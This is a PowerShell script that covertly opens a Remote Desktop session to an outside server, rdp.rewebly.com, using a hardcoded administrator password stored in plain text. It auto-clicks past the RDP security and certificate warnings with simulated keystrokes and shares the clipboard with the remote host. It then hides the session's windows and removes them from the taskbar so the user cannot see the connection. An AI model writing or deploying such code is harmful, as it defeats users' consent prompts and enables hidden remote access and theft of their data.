# --- CONFIGURATION ---
$server = "rdp.rewebly.com"
$username = "Administrator"
$password = "!Mamoute901901a"

# --- RDP file ---
$rdpContent = @"
full address:s:$server
username:s:$username
redirectclipboard:i:1
screen mode id:i:2
authentication level:i:2
enablecredsspsupport:i:1
prompt for credentials:i:0
"@
$rdpFile = "$env:TEMP\hidden.rdp"
Set-Content -Path $rdpFile -Value $rdpContent -Encoding ASCII

# --- Store credentials ---
cmdkey /generic:TERMSRV/$server /user:$username /pass:$password

# --- Launch RDP ---
$proc = Start-Process -FilePath "mstsc.exe" -ArgumentList $rdpFile -WindowStyle Minimized -PassThru

# --- Load SendKeys and Win32 APIs ---
Add-Type -AssemblyName System.Windows.Forms
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr FindWindowEx(IntPtr hWndParent, IntPtr hWndChildAfter, string lpszClass, string lpszWindow);
}
"@

# --- Wait for trust warning (Alt+N) ---
for ($i = 0; $i -lt 30; $i++) {
    $hwnd = [Win32]::FindWindow("#32770", "Remote Desktop Connection security warning")
    if ($hwnd -ne [IntPtr]::Zero) {
        [System.Windows.Forms.SendKeys]::SendWait("%n")
        break
    }
    Start-Sleep -Milliseconds 100
}

# --- Wait for certificate warning (send Alt+Y 5x when "Yes" found) ---
$certPromptClicked = $false
for ($i = 0; $i -lt 50; $i++) {
    $hwnd = [Win32]::FindWindow("#32770", "Remote Desktop Connection")
    if ($hwnd -ne [IntPtr]::Zero) {
        $btnYes = [Win32]::FindWindowEx($hwnd, [IntPtr]::Zero, "Button", "Yes")
        if ($btnYes -ne [IntPtr]::Zero) {
            # Ensure focus
            [System.Windows.Forms.SendKeys]::SendWait("% ")
            Start-Sleep -Milliseconds 100

            # Send Alt+Y multiple times
            for ($j = 0; $j -lt 5; $j++) {
                [System.Windows.Forms.SendKeys]::SendWait("%y")
                Start-Sleep -Milliseconds 150
            }

            $certPromptClicked = $true
            break
        }
    }
    Start-Sleep -Milliseconds 100
}

# --- Hide all mstsc.exe windows after prompts are cleared ---
if ($certPromptClicked) {
    if (-not ([System.Management.Automation.PSTypeName]'Win32Enum').Type) {
        Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        public class Win32Enum {
            public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
            [DllImport("user32.dll")]
            public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
            [DllImport("user32.dll")]
            public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
            [DllImport("user32.dll")]
            public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
            [DllImport("user32.dll")]
            public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
            [DllImport("user32.dll")]
            public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        }
"@
    }

    $mstscId = $proc.Id
    $handles = @()

    $callback = [Win32Enum+EnumWindowsProc]{
        param($hWnd, $lParam)
        $out = 0
        [Win32Enum]::GetWindowThreadProcessId($hWnd, [ref]$out) | Out-Null
        if ($out -eq $mstscId) { $script:handles += $hWnd }
        return $true
    }

    [Win32Enum]::EnumWindows($callback, [IntPtr]::Zero) | Out-Null

    foreach ($hwnd in $handles) {
        [Win32Enum]::ShowWindowAsync($hwnd, 0) # SW_HIDE
        $exStyle = [Win32Enum]::GetWindowLong($hwnd, -20)
        $newExStyle = ($exStyle -bor 0x00000080) -band (-bnot 0x00040000)
        [Win32Enum]::SetWindowLong($hwnd, -20, $newExStyle) | Out-Null
    }
}
